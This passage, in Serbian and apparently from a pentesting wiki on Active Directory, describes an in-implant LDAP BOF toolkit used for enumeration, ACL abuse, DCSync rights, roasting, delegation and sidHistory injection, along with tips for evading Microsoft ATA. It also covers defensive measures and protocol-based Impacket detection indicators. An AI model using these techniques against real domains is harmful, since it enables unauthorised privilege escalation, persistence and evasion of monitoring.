[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira LDAP primitive u stilu bloodyAD-a kao x64 Beacon Object Files koji se izvršavaju u potpunosti unutar implantata na hostu (npr. Adaptix C2). Operateri kompajliraju paket komandom `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim pozivaju `ldap <subcommand>` iz beacona. Sav saobraćaj koristi trenutni bezbednosni kontekst prijavljivanja preko LDAP-a (389) uz signing/sealing ili LDAPS-a (636) uz automatsko poverenje u sertifikat, tako da nisu potrebni socks proxy-ji niti artefakti na disku.<sup>[[4]](#references)</sup>

### LDAP enumeracija sa strane implantata

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` razrešavaju kratka imena/OU putanje u pune DN-ove i izlistavaju odgovarajuće objekte.
- `get-object`, `get-attribute` i `get-domaininfo` preuzimaju proizvoljne atribute (uključujući security descriptors), kao i metapodatke o šumi/domeni iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` direktno iz LDAP-a prikazuju kandidate za roasting, podešavanja delegiranja i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskriptore.
- `get-acl` i `get-writable --detailed` parsiraju DACL i prikazuju trustees, prava (GenericAll/WriteDACL/WriteOwner/zapisi atributa) i nasleđivanje, čime se odmah dobijaju mete za eskalaciju privilegija putem ACL-a.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP primitive za upis radi eskalacije i održavanja pristupa

- BOF-ovi za kreiranje objekata (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da pripremi nove principale ili računare bilo gde gde postoje OU dozvole. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju kontrolu nad ciljevima kada se pronađu dozvole za upis svojstava.
- Komande usmerene na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, pretvaraju WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinki, kontrolu članstva u grupama ili privilegije DCSync replikacije, bez ostavljanja PowerShell/ADSI tragova. Odgovarajuće komande `remove-*` uklanjaju ubačene ACE-ove.

### Delegiranje, roasting i zloupotreba Kerberos-a

- `add-spn`/`set-spn` trenutno omogućavaju Kerberoasting nad kompromitovanim korisnikom; `add-asreproastable` (UAC promena) označava ga kao podložnog AS-REP roastingu bez menjanja lozinke.
- Makroi za delegiranje (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) menjaju `msDS-AllowedToDelegateTo`, UAC zastavice ili `msDS-AllowedToActOnBehalfOfOtherIdentity` direktno iz beacon-a, omogućavajući napade preko constrained/unconstrained/RBCD putanja i uklanjajući potrebu za udaljenim PowerShell-om ili RSAT-om.

### Ubrizgavanje sidHistory, premeštanje OU objekata i oblikovanje površine napada

- `add-sidhistory` ubacuje privilegovane SID-ove u SID istoriju kontrolisanog principala (pogledajte [SID-History Injection](sid-history-injection.md)), omogućavajući prikriveno nasleđivanje pristupa u potpunosti preko LDAP/LDAPS-a.
- `move-object` menja DN/OU računara ili korisnika, omogućavajući napadaču da premesti resurse pod delegirane dozvole pre upotrebe `set-password`, `add-groupmember` ili `add-spn`. Pogledajte [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) za dozvole za premeštanje i provere nasleđivanja.
- Strogo ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) omogućavaju brzo vraćanje promena nakon što operator prikupi akreditive ili uspostavi persistence, čime se telemetrija svodi na minimum.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Neke opšte odbrane

[**Saznajte više o zaštiti akreditiva ovde.**](../stealing-credentials/credentials-protections.md)

### **Odbrambene mere za zaštitu akreditiva**

- **Ograničenja za Domain Admins**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, a ne i na druge hostove.
- **Privilegije servisnih naloga**: Servisi ne bi trebalo da rade sa privilegijama Domain Admin (DA), radi očuvanja bezbednosti.
- **Vremensko ograničavanje privilegija**: Trajanje zadataka koji zahtevaju DA privilegije treba ograničiti. To se može postići ovako: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ublažavanje LDAP relay napada**: Revidirajte Event ID-ove 2889/3074/3075, a zatim nametnite LDAP signing i LDAPS channel binding na DC-ovima/klijentima kako biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Otkrivanje Impacket aktivnosti na osnovu protokola

Ako želite da otkrijete uobičajene AD tehnike, **nemojte se oslanjati samo na tragove koje operator može da kontroliše**, kao što su preimenovane binarne datoteke, nazivi servisa, privremene batch datoteke ili putanje izlaza. Napravite baznu liniju načina na koji legitimni Windows klijenti formiraju saobraćaj za [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a zatim tražite **specifičnosti implementacije** koje ostaju čak i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ili `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandidati sa visokim stepenom pouzdanosti za samostalno otkrivanje** (nakon provere u odnosu na sopstvenu baznu liniju):
  - Autentifikovani DCE/RPC koji koristi `auth_context_id = 79231 + ctx_id`
  - DCE/RPC dopuna autentifikacije popunjena vrednošću `0xff`
  - LDAP Kerberos bind-ovi koji stavljaju sirovi Kerberos `AP-REQ` direktno u SPNEGO `mechToken`
  - SMB2/3 negotiate zahtevi sa vrednostima `ClientGuid` koje liče na ASCII tekst
  - WMI `IWbemLevel1Login::NTLMLogin` koji koristi nestandardni namespace `//./root/cimv2`
  - Fiksne vrednosti Kerberos nonce-a
- **Pogodnije kao funkcije za korelaciju/ocenjivanje**:
  - Retke ili duplirane liste Kerberos etype vrednosti, neuobičajene/nedostajuće `PA-DATA` vrednosti ili redosled etype vrednosti u TGS-REQ zahtevima koji se razlikuje od nativnog Windows-a
  - NTLM Type 1 poruke bez informacija o verziji ili Type 3 poruke sa null imenima hostova
  - Sirovi NTLMSSP prenet u DCE/RPC umesto preko SPNEGO, nedostajući DCE/RPC verification trailers ili nepodudaranja SPNEGO/Kerberos OID vrednosti
  - Više ovih karakteristika sa istog hosta/korisnika/sesije/vremenskog perioda mnogo je pouzdanije od bilo kog pojedinačnog slabog indikatora
- **Koristite kao dodatni kontekst, a ne kao samostalna upozorenja**:
  - Podrazumevana imena datoteka, putanje izlaza, nasumična imena servisa, privremena batch imena, podrazumevana imena računarskih naloga i stringovi specifični za alat u HTTP/WebDAV/RDP/MSSQL saobraćaju
  - Operatori ih lako menjaju, pa ih je najbolje koristiti za objašnjenje zašto je klaster koji obuhvata više protokola sumnjiv
- **Operativne napomene**:
  - Neki od ovih signala zahtevaju dešifrovan saobraćaj, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ili uvid na strani servisa
  - Proverite ih u odnosu na Samba/Linux klijente, uređaje i zastareo softver pre nego što ih pretvorite u upozorenja
  - Kako budete sticali poverenje u baznu liniju, unapređujte detekcije od dodatnog konteksta -> lova na pretnje -> upozorenja

### **Primena obmanjujućih tehnika**

- Primena obmane obuhvata postavljanje zamki, poput mamac korisnika ili računara, sa svojstvima kao što su lozinke koje ne ističu ili oznaka Trusted for Delegation. Detaljan pristup podrazumeva kreiranje korisnika sa određenim pravima ili njihovo dodavanje u grupe sa visokim privilegijama.<sup>[[2]](#references)</sup>
- Praktičan primer je upotreba alata kao što je: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više informacija o primeni obmanjujućih tehnika potražite na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Prepoznavanje obmane**

- **Za korisničke objekte**: Sumnjivi indikatori obuhvataju neuobičajen ObjectSID, retke prijave, datume kreiranja i mali broj pogrešnih lozinki.
- **Opšti indikatori**: Poređenje atributa potencijalnih mamac objekata sa atributima legitimnih objekata može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u prepoznavanju takvih obmana.

### **Zaobilaženje sistema za detekciju**

- **Zaobilaženje Microsoft ATA detekcije**:
  - **Enumeracija korisnika**: Izbegavajte enumeraciju sesija na Domain Controllers da biste sprečili ATA detekciju.
  - **Impersonacija tiketa**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže u izbegavanju detekcije, jer se ne prelazi na NTLM.
  - **DCSync napadi**: Preporučuje se izvršavanje sa računara koji nije Domain Controller radi izbegavanja ATA detekcije, pošto će direktno izvršavanje sa Domain Controller-a pokrenuti upozorenja.

## References

- [1] [Vodič za napade na Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Kovanje Trusts za obmanu u Active Directory-ju](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin-a do Enterprise Admin-a](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF kolekcija – LDAP alat za Active Directory eksploataciju u memoriji](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Pretvaranje NTLM hash-eva u wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analiza Impacket-a](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Preuzimanje Active Directory naloga putem Netlogon-a](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Kako upravljati promenama Netlogon bezbednih kanalnih veza povezanih sa CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Putovanje kroz zaboravljene Null Session i MS-RPC interfejse](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kao bezbednosna granica između domena? (4. deo) - Istraživanje zaobilaženja SID filtering-a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kao bezbednosna granica između domena? (5. deo) - Golden GMSA trust napad - od child do parent domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kao bezbednosna granica između domena? (6. deo) - Schema change trust napad - od child do parent domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA pomoću ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacija od administratora child domena do enterprise administratora za 5 minuta zloupotrebom AD CS-a, nastavak](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE u rukavu: osmišljavanje Active Directory DACL backdoor-a](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Izvorni kod NetExec pre2k modula](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
